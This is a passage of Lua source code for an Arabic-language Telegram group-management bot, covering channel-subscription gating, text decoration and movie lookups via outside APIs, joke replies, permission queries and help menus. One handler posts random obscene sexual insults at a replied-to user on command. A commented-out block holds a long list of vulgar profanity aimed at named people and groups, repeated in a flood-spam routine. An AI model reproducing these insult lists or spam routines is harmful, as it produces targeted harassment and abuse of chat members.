local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local Text =[[
اختر قائمه من الاسفل
َ
َ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '❶️❶', callback_data="/game1"},{text = '❷❷', callback_data="/game2"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
if database:get(bot_id..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, '⋄تم الغاء امر الزخرفه ')
database:del(bot_id..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
zh = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
zx = JSON.decode(zh) 
t = "\n⋄قائمه الزخرفه \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.." `"..v.."` \n"
end
send(msg.chat_id_, msg.id_, t..'┉┉┉┉┉┉\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•ٴ\n⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️ ')
database:del(bot_id..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
if text == 'زخرفه' or text == 'الزخرفه' then  
database:setex(bot_id.."Zrf:add"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
send(msg.chat_id_, msg.id_, '⋄ارسل لي الكلمه لزخرفتها ')
end
if text and text:match("^زخرفه (.*)$") then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://rudi-dev.tk/Amir1/Boyka.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n⋄قائمه الزخرفه \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  `"..v.."` \n"
end
send(msg.chat_id_, msg.id_, t..'┉┉┉┉┉┉\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•ٴ\n⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️ ')
end
if text and text:match("^فلم (.*)$") then
local Textm = text:match("^فلم (.*)$")
data,res = https.request('https://boyka-api.ml/movie.php?serch='..URL.escape(Textm)..'')
if res == 200 then
getmo = json:decode(data)
if getmo.Info == true then
local Text ='⋄قصه الفلم\n'..getmo.info:gsub('&hellip;','')
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Text = string.gsub(Text,"┉",text1)
Text = string.gsub(Text,"•",text2)
Text = string.gsub(Text,"Joker",text3)
Text = string.gsub(Text,"☉",text4)
Text = string.gsub(Text,"┇",text5)
Text = string.gsub(Text,"»",text6)
Text = string.gsub(Text,">",text7)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مشاهده الفلم بجوده 240',url=getmo.sd}},
{{text = 'مشاهده الفلم بجوده 480', url=getmo.Web}},
{{text = 'مشاهده الفلم بجوده 1080', url=getmo.hd}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if text and text:match("^انستا (.*)$") then
local Textni = text:match("^انستا (.*)$")
data,res = https.request('https://boyka-api.ml/infoInstagram.php?username='..URL.escape(Textni)..'')
if res == 200 then
muaed = json:decode(data)
if muaed.Info == true then
send(msg.chat_id_, msg.id_, muaed.ph, muaed.info) 
end
end
end
if text and text:match("^زخرفه (.*)$") then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n⋄قائمه الزخرفه \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  `"..v.."` \n"
end
send(msg.chat_id_, msg.id_, t..'┉┉┉┉┉┉\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•ٴ\n⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️ ')
end
if text and text:match("^برج (.*)$") then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://mode-dev.tk/Api2/Modbr.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
for k,v in pairs(br.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text and text:match("^معني (.*)$") then
local TextName = text:match("^معني (.*)$")
gk = https.request('http://sonicx.ml/Api/Name.php?Name='..URL.escape(TextName)..'')
br = JSON.decode(gk)
send(msg.chat_id_, msg.id_,br.meaning)
end
if text and text:match("^احسب (.*)$") then
local Textage = text:match("^احسب (.*)$")
ge = https.request('https://rudi-dev.tk/Amir3/Boyka.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
for k,v in pairs(ag.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "شنو رئيك بهذا" or text == "شنو رئيك بهذ" or text == "شنو رئيج بهذ" or text == "شنو رئيج بهذا" or text == "شنو رايك بهذا" or text == "شنو رايك بهذ" and tonumber(msg.reply_to_message_id_) > 0 then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ادب سسز يباوع علي بنات 😂🥺"," مو خوش ولد 😶","زاحف وما احبه 😾😹"}
send(msg.chat_id_, msg.reply_to_message_id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "شنو رئيك بهاي" or text == "شنو رئيك بهايي" or text == "شنو رئيج بهايي" or text == "شنو رئيج بهاي" or text == "شنو رايك بهاي" or text == "شنو رايك بهايي" and tonumber(msg.reply_to_message_id_) > 0 then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"دور حلوين 🤕😹","جكمه وصخه عوفها ☹️😾","حقيره ومنتكبره 😶😂"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هينه" or text == "رزله" or text == "هيني" or text == "اشتمو" and msg.reply_to_message_id_ then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"كسمك عيل وسخ","ينعل كسم اختك عيل ابن شرموطه","قولنا خلاص بكسمك"}
send(msg.chat_id_, msg.reply_to_message_id_, texting[math.random(#texting)])
send(msg.chat_id_, msg.id_, 'تم حبي 💋')
end
end
if text == "مصه" or text == "بوسه" or text == "بوسي" and msg.reply_to_message_id_ then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح💋","مح","مممووواااااححح 😍💋","💋","مواح 💋","خد مح 💋","مممححح 😍💋","محح هاي لحاته صاكه💋"}
send(msg.chat_id_, msg.reply_to_message_id_, texting[math.random(#texting)])
send(msg.chat_id_, msg.id_, 'تم حبي 💋')
end
end
--[[
if text == "حفل" or text == "نيكو" or text == "نيك كسمو" or text == "حفل عليه" then
local t7fel = {
'ههههههههههههههههههههههههههههههههههههههههه',
'يشرموط',
'يخول',
'يبن الاحبه',
'يخول يشرموط',
'يبن المتناكه يبطيق',
'يكسمك يبن الاحبه',
'يديني بفتث',
'يكسمك',
'هكر انا',
'سد يكسمك',
'يبن الخول',
'يمتناك يعرص',
'يكس متناك',
'كسختك جبت منو دم',
'كسمك جبت منو دم',
'كس ابوك جبت منو دم',
'كسم امك الاحبه',
'كسم الي ناكك',
'كسم طيزك زبي م نافع يخرج',
'كسمينك',
'زبي م نافع يخرج من كسمك',
'زبي',
'كسمك',
'كسختك',
'يخول',
'يعرص',
'يمتهان',
}
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
send(msg.chat_id_, msg.reply_to_message_id_, 'البـدايـه ❤')
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مسلم مبرمجي ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات مسلم ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات مسلم ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل اخوات مسلم ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بطوط ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات بطوط ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات بطوط ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل أحمد عياد ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل المبرمج أحمد ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل انك اتهنت ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل فلسطيني ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل ليجاند ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل فرعون ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات ليجاند ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات ليجاند ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل كسمك لاجل زبي ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بوتات التلي ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بلاك ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل ديفيد ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل استيفن ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل '..result.first_name_..' ❤') 
send(msg.chat_id_, msg.reply_to_message_id_, 'الـنـهـايـه ❤')
send(msg.chat_id_, msg.id_, 'نكت دينمو 😂😂')
send(msg.chat_id_, msg.id_, 'عد هعمل كام ريب 😂')
send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 1')
send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 2')
send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 3')
send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 4')
send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 5')
send(msg.chat_id_, msg.reply_to_message_id_, 'مات 😂')
send(msg.chat_id_, msg.reply_to_message_id_, 'بفتث 😂')
send(msg.chat_id_, msg.id_, 'امسح بقي عشان ميحصلش حاجه للروم من الشتايم 😚')
return false 
end end end
]]--
if text == "كشف الكدب" or text == 'كشف الكذب' or text == 'كداب' or text == 'كذاب' and tonumber(msg.reply_to_message_id_) > 0 then
local texting = {"دا كداب يصحبي 🙂","صادق 😊","مشعارف 😿","بيعرص 😂","كداب و تيز 😒","قوله يجيب 5 جنيه وهقول صادق 😏"}
send(msg.chat_id_, msg.id_,'جاري كشف الكدب .')
editText(msg.chat_id_, msg.id_,'جاري كشف الكدب ...')
editText(msg.chat_id_, msg.id_,'جاري كشف الكدب ....')
editText(msg.chat_id_, msg.id_,'جاري كشف الكدب .....')
editText(msg.chat_id_, msg.id_,'جاري كشف الكدب ..')
editText(msg.chat_id_, msg.id_,'جاري كشف الكدب ...')
editText(msg.chat_id_, msg.id_,'جاري كشف الكدب ....')
editText(msg.chat_id_, msg.id_,'جاري كشف الكدب .....')
editText(msg.chat_id_, msg.id_,'جاري كشف الكدب .................')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
send(msg.chat_id_, msg.id_,'جاري مراجعه البيانات')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
send(msg.chat_id_, msg.id_,''..texting[math.random(#texting)]..'')
end
if text == 'تفعيل الردود' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
database:del(bot_id..'lock:reply'..msg.chat_id_)  
Text = ' ⋄تم تفعيل الردود'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
database:set(bot_id..'lock:reply'..msg.chat_id_,true)  
Text = '\n⋄تم تعطيل الردود'
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صلاحياته" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
Get_Info(msg,msg.chat_id_,result.sender_user_id_)
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
------------------------------------------------------------------------
if text == "صلاحياتي" then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Get_Info(msg,msg.chat_id_,msg.sender_user_id_)
end  
end
------------------------------------------------------------------------
if text and text:match('^صلاحياته @(.*)') then   
local username = text:match('صلاحياته @(.*)')   
if tonumber(msg.reply_to_message_id_) == 0 then 
function prom_username(extra, result, success) 
if (result and result.code_ == 400 or result and result.message_ == "USERNAME_NOT_OCCUPIED") then
SendText(msg.chat_id_,msg.id_,"- المعرف غير صحيح \n*")   
return false  end   
Get_Info(msg,msg.chat_id_,result.id_)
end  
tdcli_function ({ID = "SearchPublicChat",username_ = username},prom_username,nil) 
end 
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
end -- Chat_Type = 'GroupBot' 
end -- end msg 
--------------------------------------------------------------------------------------------------------------
function tdcli_update_callback(data)  -- clback
if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
end
end
if data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local Text = data.payload_.data_
if Text == '/help1' then
local Teext =[[

•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄قفل + فتح ← الامر… 
⋄← { بالتقيد ، بالطرد ، بالكتم }
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄الروابط
⋄المعرف
⋄التاك
⋄الشارحه
⋄التعديل
⋄التثبيت
⋄المتحركه
⋄الملفات
⋄الصور
⋄التفليش
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄الماركداون
⋄البوتات
⋄الاباحي
⋄التكرار
⋄الكلايش
⋄السيلفي
⋄الملصقات
⋄الفيديو
⋄الانلاين
⋄الدردشه
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄التوجيه
⋄الاغاني
⋄الصوت
⋄الجهات
⋄الاشعارات
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
]]
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Teext = string.gsub(Teext,"┉",text1)
Teext = string.gsub(Teext,"•",text2)
Teext = string.gsub(Teext,"Joker",text3)
Teext = string.gsub(Teext,"☉",text4)
Teext = string.gsub(Teext,"┇",text5)
Teext = string.gsub(Teext,"»",text6)
Teext = string.gsub(Teext,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
},
{
{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
{
{text = '⌯ قفل و القفل ⌯', callback_data="/help"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help2' then
local Teext =[[

┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⋄اوامر تفعيل وتعطيل
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄اطردني
⋄صيح
⋄ضافني
⋄الرابط 
⋄الحظر
⋄الرفع
⋄الايدي
⋄الالعاب
⋄الردود العامه
⋄ردود البوت
⋄الترحيب
⋄الردود
⋄ٴall
⋄الردود
⋄نسبة الحب
⋄نسبة الرجوله
⋄نسبه الانوثه 
⋄نسبه الكره
⋄حساب العمر
⋄تنبيه الاسما
⋄تنبيه المعرف
⋄تنبيه الصور
⋄التوحيد
⋄الكتم الاسم
⋄زخرفه
⋄ردود البوت
⋄اوامر التسليه
⋄صورتي 
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
]]
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Teext = string.gsub(Teext,"┉",text1)
Teext = string.gsub(Teext,"•",text2)
Teext = string.gsub(Teext,"Joker",text3)
Teext = string.gsub(Teext,"☉",text4)
Teext = string.gsub(Teext,"┇",text5)
Teext = string.gsub(Teext,"»",text6)
Teext = string.gsub(Teext,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
},
{
{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
{
{text = 'قفل و القفل', callback_data="/help1"},{text = '⌯ تعطيل و تفعيل ⌯', callback_data="/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help3' then
local Teext =[[

┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⋄اوامر الوضع - اضف
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄اضف / مسح ← رد
⋄اضف / مسح ← صلاحيه
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄ضع + امر …
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄اسم
⋄رابط
⋄ترحيب
⋄قوانين
⋄رد متعدد 
⋄صوره
⋄وصف
⋄تكرار + عدد
•┉ • ┉ • ┉ Joker ┉ • ┉ • 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⋄اوامر مسح / المسح ← امر
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄مسح + امر ↓
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄الايدي 
⋄المميزين
⋄الادمنيه
⋄المدراء
⋄المنشئين
⋄الاساسين
⋄الاسما المكتومه
⋄الردود
⋄البوتات
⋄امسح
⋄صلاحيه
⋄قائمه منع المتحركات
⋄قائمه منع الصور
⋄قائمه منع الملصقات
⋄مسح قائمه المنع
⋄المحذوفين
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄مسح  امر + الامر القديم  
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄الاوامر المضافه ( لعرض الاوامر المضافه ) 
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
]]
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Teext = string.gsub(Teext,"┉",text1)
Teext = string.gsub(Teext,"•",text2)
Teext = string.gsub(Teext,"Joker",text3)
Teext = string.gsub(Teext,"☉",text4)
Teext = string.gsub(Teext,"┇",text5)
Teext = string.gsub(Teext,"»",text6)
Teext = string.gsub(Teext,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '⌯ ❶️❶ ⌯', callback_data="/help"},{text = '❷❷', callback_data="/help4"},
},
{
{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
{
{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help4' then
local Teext =[[

┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⋄اوامر تنزيل ورفع
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄مميز
⋄ادمن
⋄مدير
⋄منشئ
⋄منشئ اساسي
⋄مالك
⋄الادمنيه
⋄ادمن بالجروب
⋄ادمن بكل الصلاحيات
⋄القيود 
⋄تنزيل جميع الرتب
⋄تنزيل الكل 
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄اوامر التغير …
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄تغير رد المطور + اسم
⋄تغير رد المالك + اسم
⋄تغير رد منشئ الاساسي + اسم
⋄تغير رد المنشئ + اسم
⋄تغير رد المدير + اسم
⋄تغير رد الادمن + اسم
⋄تغير رد المميز + اسم
⋄تغير رد العضو + اسم
⋄تغير امر الاوامر
⋄تغير امر م1 ~ الئ م10
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
⋄اوامر المجموعه 📢 .
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄استعاده الاوامر 
⋄تحويل كالاتي~⪼ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
⋄صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
⋄كشف القيود
⋄تعين الايدي
⋄تغير الايدي
⋄الحساب + ايدي الحساب
⋄مسح + العدد
⋄تنزيل الكل
⋄تنزيل جميع الرتب
⋄منع + برد
⋄~ الصور + متحركه + ملصق ~
⋄حظر ~ كتم ~ تقيد ~ طرد
⋄المحظورين ~ المكتومين ~ المقيدين
⋄الغا كتم + حظر + تقيد ~ بالرد و معرف و ايدي
⋄تقيد ~ كتم + الرقم + ساعه
⋄تقيد ~ كتم + الرقم + يوم
⋄تقيد ~ كتم + الرقم + دقيقه
⋄تثبيت ~ الغا تثبيت
⋄الترحيب
⋄الغا تثبيت الكل
⋄كشف البوتات
⋄الصلاحيات
⋄كشف ~ برد ← بمعرف ← ايدي
⋄تاك للكل
⋄وضع لقب + لقب
⋄مسح لقب بالرد
⋄اعدادات المجموعه
⋄عدد الجروب
⋄الردود
⋄اسم بوت + الرتبه
⋄الاوامر المضافه
⋄وضع توحيد + توحيد
⋄تعين عدد الكتم + رقم
⋄كتم اسم + اسم
⋄التوحيد
⋄قائمه المنع
⋄نسبه الحب 
⋄نسبه رجوله
⋄نسبه الكره
⋄نسبه الانوثه
⋄الساعه
⋄التاريخ
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
]]
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
Teext = string.gsub(Teext,"┉",text1)
Teext = string.gsub(Teext,"•",text2)
Teext = string.gsub(Teext,"Joker",text3)
Teext = string.gsub(Teext,"☉",text4)
Teext = string.gsub(Teext,"┇",text5)
Teext = string.gsub(Teext,"»",text6)
Teext = string.gsub(Teext,">",text7)keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❶️❶', callback_data="/help3"},{text = '⌯ ❷❷ ⌯', callback_data="/help"},
},
{
{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
{
{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help5' then
local Teext =[[

⋄اوامر المطورين
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄تفعيل ← تعطيل 
⋄المجموعات ← المشتركين ← الاحصائيات
⋄رفع ← تنزيل منشئ اساسي
⋄مسح الاساسين ← المنشئين الاساسين
⋄مسح المنشئين ← المنشئين
⋄اسم ~ ايدي + بوت غادر 
⋄اذاعه 
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⋄اوامر مطور الاساسي
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄تفعيل
⋄تعطيل
⋄مسح الاساسين
⋄المنشئين الاساسين
⋄رفع/تنزيل منشئ اساسي
⋄رفع/تنزيل مطور اساسي 
⋄مسح المطورين
⋄المطورين
⋄رفع | تنزيل مطور
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄اسم البوت + غادر
⋄غادر
⋄اسم بوت + الرتبه
⋄تحديث السورس
⋄حضر عام
⋄كتم عام
⋄الغا العام
⋄قائمه الحظر العام
⋄مسح قائمه الحظر العام
⋄جلب نسخه الاحتياطيه
⋄رفع نسخه الاحتياطيه
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄اذاعه خاص
⋄اذاعه
⋄اذاعه بالتوجيه
⋄اذاعه بالتوجيه خاص
⋄اذاعه بالتثبيت
•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•
⋄جلب نسخه البوت
⋄رفع نسخه البوت
